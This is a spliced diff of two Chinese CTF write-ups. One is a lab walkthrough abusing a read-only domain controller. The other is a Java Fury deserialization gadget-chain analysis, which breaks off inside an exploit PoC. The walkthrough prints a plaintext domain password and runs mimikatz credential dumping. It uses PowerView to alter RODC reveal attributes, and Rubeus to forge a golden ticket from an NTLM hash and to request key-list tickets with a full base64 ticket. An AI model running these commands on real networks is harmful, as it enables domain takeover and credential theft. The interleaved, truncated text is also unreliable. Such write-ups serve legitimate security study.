+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324165420740.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324165420740.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260324165420740"></p>
+<p>proxychains4 rdesktop 192.168.8.12上去改密码</p>
+<p>vertexsoft.local\CharlieCloud:u!6vDaGQOA</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324170013372.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324170013372.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260324170013372"></p>
+<p>flag{13dff5f0-370d-420f-a111-189675d7b157}</p>
+<h3 id="flag8"><a href="#flag8" class="headerlink" title="flag8"></a>flag8</h3><p>RODC，没听过，照着打</p>
 <blockquote>
-<p>native-image.properties 是用于配置 GraalVM Native Image 编译选项的属性文件。它允许开发者指定在将 Java 应用程序编译为原生可执行文件时使用的各种参数和选项。</p>
+<p>如果有修改RODC属性的权限，可以修改两个关键属性，将域管添加到 msDS-RevealOnDemandGroup  属性中，然后抓取RODC的krbtgt_xxxxx账号凭证，伪造域管的金票，随后发起TGS-REQ（包含KERB-KEY-LIST-REQ），这时域控会回给RODC一个KERB-KEY-LIST-REP包，该包内含有域管的凭证</p>
 </blockquote>
-<p>如果使用DisallowedList，则会从本地读取fury&#x2F;disallowed.txt文件，应用黑名单。</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227213637843.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227213637843.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>从官网的org.apache.fury:fury-core:0.8.0，也找到一份disallowed.txt，diff一下发现少了一个sun.print，多了一个com.feilong.lib</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227215037890.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227215037890.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<h3 id="compare"><a href="#compare" class="headerlink" title="compare"></a>compare</h3><p>下面感觉是codeQL做的了（，正常真的很难找到入口类</p>
-<p><code>com.feilong.core.util.comparator.PropertyComparator#compare()</code>两个参数不为空且不同的情况下，调用了PropertyUtil.getProperty</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227223158647.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227223158647.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>接着调用了PropertyValueObtainer.obtain</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227223320962.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227223320962.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>object方法调用PropertyDescriptorUtil.isUseSpringOperate()判断本地是否有spring依赖，如果是就调用getDataUseSpring去获取数据，否则调用getDataUserApache以Apache的方式获取数据</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227223453193.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227223453193.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227223650671.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227223650671.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>跟进getType，可以看到getType就是从缓存MAP里读取type，没有的话就调用buildType新建Type</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227224113840.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227224113840.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>buildType调用getSpringpropertyDescriptor获取类的属性描述符</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227224208654.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227224208654.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>关掉WD，上传猕猴桃，PowerView.ps1和Rubeus.exe</p>
+<p>rdesktop有bug上传不了文件，windows上代理用原生rdp上传文件</p>
+<p>获取RODC的krbtgt_xxxxx账号凭证</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ADComputer RODC -Properties msDS-KrbTgtLink</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324170258018.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324170258018.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260324170258018"></p>
+<p>SID <code>S-1-5-21-1670446094-1720415002-1380520873-1106</code></p>
+<p>抓hash，需要管理员开powershell</p>
+<p><code>./mimikatz.exe &quot;Privilege::Debug&quot; &quot;log&quot; &quot;lsadump::lsa /patch&quot; &quot;exit&quot;</code></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324171657969.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324171657969.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260324171657969"></p>
+<p>找到了krbtgt_4156的NTLM</p>
+<p>导入powerView.ps1，清空msDS-NeverRevealGroup属性</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\PowerView.ps1</span><br><span class="line">Set-DomainObject -Identity <span class="string">&#x27;CN=RODC,OU=Domain Controllers,DC=vertexsoft,DC=local&#x27;</span> -Clear <span class="string">&#x27;msDS-NeverRevealGroup&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后将域管理员账户添加到msDS-RevealOnDemandGroup 属性中</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-DomainObject -Identity <span class="string">&#x27;CN=RODC,OU=Domain Controllers,DC=vertexsoft,DC=local&#x27;</span> -Set @&#123;<span class="string">&#x27;msDS-RevealOnDemandGroup&#x27;</span>=@(<span class="string">&#x27;CN=Administrator,CN=Users,DC=vertexsoft,DC=local&#x27;</span>)&#125;</span><br></pre></td></tr></table></figure>
+
+<p>构造黄金票据（这里我也不知道为什么不要sid后几位）</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./Rubeus.exe golden /rodcNumber:<span class="number">4156</span> /rc4:<span class="number">34</span>e335179246ef930dc33fd1e3de6e9e /user:administrator /id:<span class="number">500</span> /domain:vertexsoft.local /sid:S<span class="literal">-1-5-21-1670446094-1720415002-1380520873</span> /nowrap</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324172551988.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20260324172551988.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20260324172551988"></p>
+<p>好熟悉，打完得去整理一下了</p>
+<p>这个有概率不成功，需要重启靶机</p>
 <blockquote>
-<p>属性描述符（PropertyDescriptor）是 Java 中用于描述类的某个属性（字段）的元数据信息。它通常包含以下内容：<br>属性名称、属性类型、获取该属性值的方法（getter 方法）、设置该属性值的方法（setter 方法）<br>在 Java 中，PropertyDescriptor 类位于 java.beans 包中，常用于反射机制来获取和操作类的属性。通过 PropertyDescriptor，可以动态地访问对象的属性，而不需要直接调用 getter 和 setter 方法。</p>
+<p>将这个黄金票据用于向域控发送kebtgt服务的TGS-REQ，TGS-REQ包含 Key List Request(KERB-KEY-LIST-REQ)结构，该结构用于请求KDC 可以提供给客户端的密钥类型列表。如果目标账户在RODC的 msDS-RevealOnDemandGroup 属性中且不在 msDS-NeverRevealGroup  属性中，TGS-REP将返回一个包含目标用户凭证的KERB-KEY-LIST-REP结构，解密后可以获得其hash从而进行PTH。</p>
+<p>ref:<a target="_blank" rel="noopener" href="https://fffffilm.top/2025/07/13/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Vertex/">https://fffffilm.top/2025/07/13/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Vertex/</a></p>
 </blockquote>
-<p>spring中就是检查是否存在SpringBeanUtils类，用这个类能更方便的返回属性描述符。</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227224907779.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227224907779.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<blockquote>
-<p>SpringBeanUtils 是Spring框架中的一个工具类，提供了多种与Bean操作相关的静态方法。在这个场景中，它主要用于获取属性描述符（PropertyDescriptor）。如果项目中没有引入Spring的相关依赖或类加载失败，SpringBeanUtils 类将不可用，此时方法会返回null。</p>
-</blockquote>
-<p>扯远了，继续回到PropertyValueObtainer.obtain，这里没有spring依赖就调用getDataUseApache</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227225124821.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227225124821.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>然后调用PropertyUtils.getPropety()，其实后面就和Shiro的CB链原理一样了，复习一遍还是敲上来</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227230006545.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227230006545.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>PropertyUtils.getPropety()调用到了PropertyUtilsBean.getProperty()</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227230437861.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227230437861.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>然后调用getSimpleProperty</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227230535360.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227230535360.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>调用getReadMethod获取了所有的getter，然后invokeMethod进行调用</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227231109755.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227231109755.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>理一下思路，因为compare()是比较两个对象，所以会调用其对象的每个getter取出对应的属性值，形成一个Comparable进行比较，这就给了调用任意getter的空间</p>
-<p>如果没有在spring环境下，会用Apache的方式处理数据。由于spring下有SpringBeanUtils，可以直接使用其静态方法getPropertyDescriptor得到属性描述符。而无spring依赖下，需要调用PropertyUtils.getProperty去获取对象的属性值，就调用到了对应的getter。那么理论上说来，spring环境下也是调用对应的getter去获取属性值，也会发生漏洞。只是走的路径不同而已。</p>
-<p>所以以后看到compare就要想到任意getter的调用哇</p>
-<p>其实这里的PropertyComparator入口类就是替代的CB链里的BeanComparator的作用</p>
-<h3 id="fury反序列化触发compare"><a href="#fury反序列化触发compare" class="headerlink" title="fury反序列化触发compare"></a>fury反序列化触发compare</h3><p>按照CB链触发compare的思路，前面接上PriorityQueue，就能得到如下的PriorityQueue.add-&gt;offer-&gt;siftUp-&gt;siftUpUsingComparator-&gt;PropertyComparator.compare的链子</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227231849194.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250227231849194.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>现在只需要找到触发PriorityQueue.add的地方</p>
-<p>fury在反序列化PriorityQueue时，打个断点测试得知用的&#96;org.apache.fury.serializer.collection.CollectionSerializers下的内部类PriorityQueueSerializer进行的处理</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228133044708.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228133044708.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228133417837.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228133417837.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>由于该类并没有read方法，而其父类CollectionSerializer有，所以调用到的CollectionSerializer.read()，该方法有调用了readElements</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228133512144.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228133512144.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>然后检查集合下的元素序列化器是否存在，如果不存在，根据泛型类型选择不同的读取方法。这里传进去的元素没有泛型类型就默认调用generalJavaRead</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228133706640.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228133706640.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>然后调用readSameTypeElements</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228134341238.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228134341238.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>readSameTypeElements内循环把每个元素序列化后的结果用add添加进collection</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228135920920.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228135920920.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>也就是说传PriorityQueue默认调用PriorityQueueSerializer去反序列化，最后会用add将队列元素添加进去。</p>
-<p>思路就理顺了，链子：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue.add -&gt;</span><br><span class="line">    PropertyComparator.compare -&gt; 任意getter</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe asktgs /enctype:rc4 /keyList /service:krbtgt/vertexsoft.local /dc:DC.vertexsoft.local /ticket:doIFWzCCBVegAwIBBaEDAgEWooIETDCCBEhhggREMIIEQKADAgEFoRIbEFZFUlRFWFNPRlQuTE9DQUyiJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEHZlcnRleHNvZnQubG9jYWyjggP8MIID+KADAgEXoQMCAQOiggPqBIID5srrghnulL1FS6b2Qx5xZve5HqdV5J7BXkuwVbZupWz0DDxujZIVBZlpM6w83cKPOXnWuKe8TUjrxZPVSDkTO1YoA+jyT028VOVKOlhJ3fu+llsDrjyUtDGEeeH+ULHMyAt1lQZN7XMjGS/A4KWn61sVA6kew/QEH9v7MMJwK2MCNGcM1+cnJiLNZQzO3BFpsj+jH91gOeDpQ+JebXWlZktnhjYFYWqbXj2VaKgOfDbQn1Hd3lnWYJ+KLQUZOvjMRerYED5WLNTl1hAmSo1UPRgPDDky09oYkDf6jd2a18w2zq6XLB8SXCELv31SOshAuGJ2dap+rlNau+GyplVT8apj8St9uRYvSjDTRbx0bOo6SHf1KXQX/Jp5qnpt56eELVa9KK2ketu/W5yHe1tpsU4nD4LQjrrmO1P4yddI84SY77skTcbrX6rZ/30nNL1Tqo0UHq/IKk04wfrBPE+X5dIJKshUKNfsh9/bhJpkGejb7X3rJBaGAqsCwXfwtC7X7XTPJOUGZdRDi6FPA4VYLfsfj8umy06yr9+sPd1KD2WfbgD2cyyfbyazctVqWQclWU23fzuG5PEbnfQMnsRJ2bDIsYrvL2g9EZNDnWd+yaLPCZOQbUWI0CaPmRYPx83z0RdeFBK3C6/JQlwBHdVvkh7K6wZgfzHMRe64tBXU8rwD9PhIJf+7L3A3PUBBZuC4zY7IS7n+tVH+DNyb8QIUWVM7VRdpikNyyNoO+rkXpfso1ZoADrEzOGSX3Atbj3W1B7CKujyx/SRRbZ8Tw4UivxbtvVZiJ8v46W4Ftp+jw/e2257udaHcLGoAOzDLdEMk+wVx2fO/Mid/E8RdljvXz3wfMQkkpcfDuJHaPKUEC5DkNbYfyMW5ND+9E7QI9rWP2GcYc2Lil/Pzi6FUfFyrZR7Gt0hdSaPOoYo2mB6vH67EzGtsxIThg8ppm2/Iw6XCoO6uJa3ymtiFOU2wCBMljwFXHnQbm2ZIq7GO/+/1MvvfQoDa5W4tauPNzuxg8Z5O172k523PHCd19ZmcHt09WQXrYUYo6jrUXiDgpZYBl80QInPfbJsy8NJygPGfzpyNExHVYH6nMjzMx3PNY/DvoyZu2MPtFAB0+Zwcvo6t0LbOx0rmYzauLlZ7t1k7lrIonwqnj8QEA3xvV+RhtcNEuQSiTEQc5c5kHYq6NbtcA/xNCaAb+/4P322+gL/oG7woQxL3eSRPTSyLqNSLjL+6P4Qzf+iJSlT1e4pa0Y4H/Jxp1vYB8F2vkAWFutRwAZUcP8lEpFVM6eHQjRK475FDY0So4DMxkERPLwTpmzUWCmaRgawOheGgo4H6MIH3oAMCAQCige8Egex9gekwgeaggeMwgeAwgd2gGzAZoAMCARehEgQQKIViYqSqxaBb/wsyzL6ip6ESGxBWRVJURVhTT0ZULkxPQ0FMohowGKADAgEBoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAQOAAAKQRGA8yMDI2MDMyNDEwMjMzOVqlERgPMjAyNjAzMjQxMDIzMzlaphEYDzIwMjYwMzI0MjAyMzM5WqcRGA8yMDI2MDMzMTEwMjMzOVqoEhsQVkVSVEVYU09GVC5MT0NBTKklMCOgAwIBAqEcMBobBmtyYnRndBsQdmVydGV4c29mdC5sb2NhbA==</span><br></pre></td></tr></table></figure>
 
-
-
-<h3 id="绕黑名单"><a href="#绕黑名单" class="headerlink" title="绕黑名单"></a>绕黑名单</h3><p>别忘了上面的黑名单里面过滤了TempleatesImpl，不能直接反序列化</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228140605018.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228140605018.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>这里提一嘴为什么可以直接触发com.feilong.lib.beanutils.PropertyUtilsBean#invokeMethod，因为这个类是衍生调用到的方法，并没有经过fury反序列化，也就不会触发黑名单</p>
-<p>绕过的方式就是找一个二次反序列化的点</p>
-<p>cn.hutool.core.map.MapProxy是个代理类，看到实现了InvocationHandler</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228140952625.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228140952625.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>代理类的话条件反射看到其invoke方法，调用了Convert.convert</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228140902752.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228140902752.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>跟进两步，到达convertWithCheck，接着调用了ConverterRegistry.convert</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228141111719.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228141111719.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>这里如果MapProxy代理的类是个Bean，就调用BeanConverter.convert</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228141221949.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228141221949.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>因为BeanConverter没有这个方法，转到父类调用</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228141327658.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228141327658.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>convert参数不为空，且两个参数不为对方的子类，targetType不是Map的子类时，调用convertInternal</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228141414089.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228141414089.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>然后调用ObjectUtil.deserialize</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228141640198.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228141640198.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>然后跟到调用IoUtil.readObj，注意这里用ByteArrayInputStream包装了bytes</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228141718797.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228141718797.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>然后就是调用原生反序列化</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228141809728.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228141809728.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>MapProxy.invoke就是个二次反序列化的点</p>
-<p>二次反序列化就重新打一遍PriorityQueue触发到getter，也就是TemplatesImpl.getOutputProperties</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Fury.deserialize -&gt;</span><br><span class="line">    CollectionSerializer.read -&gt;</span><br><span class="line">    PriorityQueue.add -&gt;</span><br><span class="line">    PropertyComparator.compare -&gt;</span><br><span class="line">    PropertyUtilsBean.invokeMethod -&gt; getter</span><br><span class="line">    </span><br><span class="line">    MapProxy.invoke -&gt;</span><br><span class="line">    BeanConverter.convertInternal -&gt;</span><br><span class="line">    readObject -&gt; PriorityQueue.readObject -&gt;</span><br><span class="line">    TemplatesImpl.getOuputProperties</span><br></pre></td></tr></table></figure>
-
-<p>现在的问题是构造的MapProxy应该代理哪个对象的getter，注意到前面分析的时候在ConverterRegistry.convert，需要rowType满足isBean</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228144016900.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228144016900.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>也就是有setter和public 字段</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228144133243.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228144133243.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>我们又需要getter去触发到MapProxy.invoke，所以随便找个Bean接口，com.feilong.lib.digester3.ObjectCreationFactory就符合要求，propName传digester触发getter</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228144258064.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250228144258064.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>官方wp有poc，就不装模做样改一下了：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cn.hutool.core.map.MapProxy;</span><br><span class="line"><span class="keyword">import</span> cn.hutool.core.util.ReflectUtil;</span><br><span class="line"><span class="keyword">import</span> cn.hutool.core.util.SerializeUtil;</span><br><span class="line"><span class="keyword">import</span> com.feilong.core.util.comparator.PropertyComparator;</span><br><span class="line"><span class="keyword">import</span> com.feilong.lib.digester3.ObjectCreationFactory;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.fury.Fury;</span><br><span class="line"><span class="keyword">import</span> org.apache.fury.config.Language;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span 